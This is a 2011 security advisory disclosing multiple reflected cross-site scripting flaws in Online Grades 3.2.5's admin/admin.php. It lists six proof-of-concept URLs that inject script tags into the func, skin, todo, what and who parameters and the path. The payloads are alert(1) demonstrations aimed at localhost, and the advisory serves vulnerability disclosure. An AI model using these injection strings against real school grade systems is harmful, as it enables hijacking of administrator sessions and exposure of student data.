@@ -1,0 +1,44 @@
+
+Online Grades 3.2.5 Multiple XSS Vulnerabilites
+
+
+Vendor: Online Grades Project Team
+Product web page: http://www.onlinegrades.org
+Affected version: 3.2.5
+
+Summary: Online Grades is the leading free-software project
+that allows K-12+ student grades attendance information to
+be posted onto a dynamic web site.
+
+Desc: Online Grades suffers from multiple cross-site scripting
+vulns. The issue is triggered when input passed via multiple
+parameters to the 'admin/admin.php' script is not properly
+sanitized before being returned to the user. This can be exploited
+to execute arbitrary HTML and script code in a user's browser
+session in context of an affected site.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2011-5029
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5029.php
+
+
+22.07.2011
+
+
+---
+
+http://localhost/admin/admin.php?func=1"><script>alert(1)</script>&skin=classic
+http://localhost/admin/admin.php?func=0&skin=1"><script>alert(1)</script>
+http://localhost/admin/admin.php?func=0&todo=1"><script>alert(1)</script>
+http://localhost/admin/admin.php?func=0&what=1"><script>alert(1)</script>&who=Faculty
+http://localhost/admin/admin.php?func=0&what=mail&who=1"><script>alert(1)</script>
+http://localhost/admin/admin.php/>"><script>alert(1)</script>
